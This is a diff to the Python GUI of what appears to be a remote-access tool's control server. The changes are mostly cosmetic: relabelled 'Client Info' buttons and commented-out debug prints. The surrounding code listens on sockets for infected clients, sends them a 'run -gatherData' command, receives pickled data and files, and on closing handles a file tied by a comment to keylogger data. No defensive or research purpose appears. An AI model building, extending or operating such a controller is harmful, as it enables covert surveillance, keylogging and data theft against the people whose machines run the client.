@@ -136,7 +136,7 @@ class App(customtkinter.CTk):
                                              command=self.startGathering, 
                                              fg_color="#a10505",
                                              hover_color="black",  
-                                             text="Show Clients")
+                                             text="Show Client Info")
         self.button.grid(row=5,column=0,pady=10,sticky="n", padx=10)
         
         #! Center Frame: Main content/command line
@@ -178,7 +178,7 @@ class App(customtkinter.CTk):
             mus_t.start()
         
             
-        play_backround_sound()    
+        #play_backround_sound()    
         
         #! CLI SOCKET SEGMENT
         def start_CLI_socket():
@@ -188,14 +188,12 @@ class App(customtkinter.CTk):
 
         def create_CLI_socket():
             global cli
-            print("Created CLI socket")
             while True:
                 with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as Ip_info: # This will get the Clients IP and Port so that the CLI can connect
                         Ip_info.bind(("127.0.0.1", 44404))
                         Ip_info.listen(1)
                         conn, addr = Ip_info.accept()
                         with conn:
-                            print("CONNECTEDDDDDDD")
                             while True: 
                                 msg = conn.recv(128).decode("utf-8")
                                 if msg:
@@ -225,7 +223,7 @@ class App(customtkinter.CTk):
 
             #? Checks if the client is still connected
             while True:
-                print("Checking client status.")
+                #print("Checking client status.")
                 try: cli.send(bytes("TEST DATA", "utf-8")) #? Send data to see if Client is online
                 except Exception as e: 
                     if "[WinError 10056] A connect request was made on an already connected socket" in str(e): pass
@@ -282,7 +280,7 @@ class App(customtkinter.CTk):
         
         #? FILE_TRANSFER SOCKET
         def start_file_name_socket():
-            print("\nDICT_TRANSFER: Server started.")
+            #print("\nDICT_TRANSFER: Server started.")
             t4 = threading.Thread(target=create_file_name_socket)
             t4.daemon = True
             t4.start()
@@ -296,16 +294,16 @@ class App(customtkinter.CTk):
                 self.SERVER_SOCKETS.append(s)
                 # Continue
                 s.bind((HOST, PORT))
-                print("DICT_TRANSFER: Listening for clients.\n")
+                #print("DICT_TRANSFER: Listening for clients.\n")
                 s.listen()
                 conn, addr = s.accept()
                 self.CLIENT_IP.append(addr)
                 # Accept the pickle list and print it
                 with conn:
-                    print(f"DICT_TRANSFER: Connected by {addr}")
+                    #print(f"DICT_TRANSFER: Connected by {addr}")
                     data = conn.recv(1024)
                     data = pickle.loads(data)
-                    print(data)
+                    #print(data)
       
         def start_file_transfer_socket():
             print("\nFILE_TRANSFER: Server started.")
@@ -313,7 +311,9 @@ class App(customtkinter.CTk):
             t5.daemon = True
             t5.start()
             
-
+        ##########################################################################################################
+        # TODO: Rework the entire file transfer system, either in python without the conjoined header or in Rust #
+        ##########################################################################################################
         def create_file_transfer_socket():
             HOST = self.file_transfer_SOIP
             PORT = self.file_transfer_SOPORT
@@ -323,7 +323,6 @@ class App(customtkinter.CTk):
                 s.bind((HOST, PORT))
                 s.listen()
                 self.SERVER_SOCKETS.append(s)
-                #print("I AM LISTENING")
                 self.m_textbox.insert("0.0", f"\nFile Transfer online.\n")  
                 while True:
                     print("I AM ACCEPTING")
@@ -332,8 +331,7 @@ class App(customtkinter.CTk):
                     # Variables for the message while loop
                     msg_size = 77
                     msg = b''
-                    while True:
-                        # TODO Make the recv wait untill all 77 bytes are recieved                
+                    while True:          
                         while len(msg) < msg_size:
                             msg = conn.recv(77).decode("utf-8") # ! 64b(File bytes) + 13b(HEADER) 
                             #print(f"{len(msg)}, {msg}\n")
@@ -499,14 +497,15 @@ class App(customtkinter.CTk):
         th.start() 
 
     def Gathering(self):
-        print("Starting1")
+        print("Starting1") 
         with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
             sock.bind((self.gather_SOIP, self.gather_SOPORT))
             window = customtkinter.CTkToplevel(self)
-            window.geometry("600x400")
-            our_box = customtkinter.CTkTextbox(window, 200, 200, bg_color='red')
+            window.geometry("400x400")
+            our_box = customtkinter.CTkTextbox(window, 400, 400, text_color="white")
             our_box.place(relx=0.5, rely=0.5, anchor=tkinter.CENTER)
-            window.title("Client List")
+            window.title("Client Info")
+            our_box.insert(customtkinter.END, "veci")
             cli.send('run -gatherData'.encode("utf-8"))
             sock.listen()
             conn, _ = sock.accept()
@@ -518,10 +517,9 @@ class App(customtkinter.CTk):
                 if len(infos) > 3:
                     break
             for info in infos:
+                # TODO: Format the output so that it clearly defines what data belongs to which system/property
                 our_box.insert(customtkinter.END, f"{info}\n")
 
-# Before closing save the keylogger data
-# TODO: Before closing send a server closing message to the client afterwards cleanly kill all active sockets
 def on_closing():
     if messagebox.askokcancel("Quit", "Do you want to quit?"):
         k_file.close()
